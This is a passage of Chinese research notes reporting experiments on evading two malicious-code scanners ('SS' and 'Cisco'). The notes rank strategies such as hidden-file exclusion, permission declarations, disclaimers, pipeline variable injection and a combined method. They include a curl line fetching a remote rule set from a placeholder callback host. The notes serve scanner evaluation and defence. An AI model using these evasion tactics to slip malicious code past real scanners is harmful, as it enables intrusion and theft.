## 二、关键结论（新标准下）

### 1. SS 绕过率 Top 3（新标准）
| 排名 | 实验 | SS 绕过(≤50) | 机制 |
|---|---|---|---|
| 1 | Arm8 混合 / Arm9 manifest / Arm11B / **Arm13 组合** | 100% | 隐藏+间接 / 声明 / wild 机制 / 组合 |
| 2 | Arm7 隐藏文件 | 93% | 文件收集层排除 |
| 3 | Arm11A finding 特化 | 50% | 表达层特化 |

### 2. 真正的"强绕过"（SS=0 完全绕过 + 可复现）
- **Arm13 组合策略（2/5 SS=0 + 2 全漏）**——最可靠的新方向
  - `curl -s {CALLBACK}/rules -o /tmp/rules.json`（远端规则集，恶意在远端内容）+ 管道内联代码 + 权限声明齐全 + 数据管道表达
- **Arm11B wild 机制（3/5 SS=0）**——变量注入管道 + 免责 + 声明一致
- **Arm7/8 隐藏文件（15/20 SS=0）**——文件层排除（最硬但取巧）

### 3. b2 形态扩样结论（诚实）
- **b2 单样本三家全漏不可复现**：扩样 10 样本 SS 大多 100（仅 2 个 ≤50）
- 原因：扩样时 LLM 生成的恶意更显眼（凭证收集具体化），SS 语义抓到
- **启示：单样本绕过 ≠ 稳定绕过**——必须扩样验证

### 4. Cisco 视角
- **线A finding 特化 Cisco 0/6（100% 绕）**——表达层特化对 Cisco 全有效
- **Arm13 组合 Cisco 3/5 检出**（组合里有显眼外传时 Cisco 抓）——但 arm13-04/05 Cisco 漏
- Cisco 盲区：表达层特化 + 纯指令执行阶段 + 阈值吞 MEDIUM

## 三、方法学沉淀

1. **净化流程**（恶意写实校验 + 技术失败分类 + 完整性审计）——不做则结论全错（Arm10 初版"SS 28%"是假象）
2. **绕过判定需用"程度"而非"二元"**——SS≤50 部分绕过更符合实战（弱信号=可绕过），用户定义合理
3. **单样本绕过必须扩样验证**——b2 教训：单样本全漏扩样后不可复现
4. **LLM 生成质量**：管线缺陷（脚本缺失/名字不一致）已修复，parse_output 兼容 4 格式

## 四、对论文/周会价值

- **S5 最硬成果**：Arm13 组合策略（数据管道+内联代码+声明一致+权限+免责）——SS 5/5 绕过（≤50），2 全漏，可复现
- **四层盲区谱系**：坐标→载荷→语义→文件层（+表达层，Arm11A 新维度）
- **Cisco vs SS 对比**：Cisco 表达层脆弱（0/6），SS 语义层韧性（写实必抓）但文件层/管道层盲
- **威胁模型**：攻击者用"组合策略"（非单一技巧）可系统性压 SS 分——扫描器需跨层防御
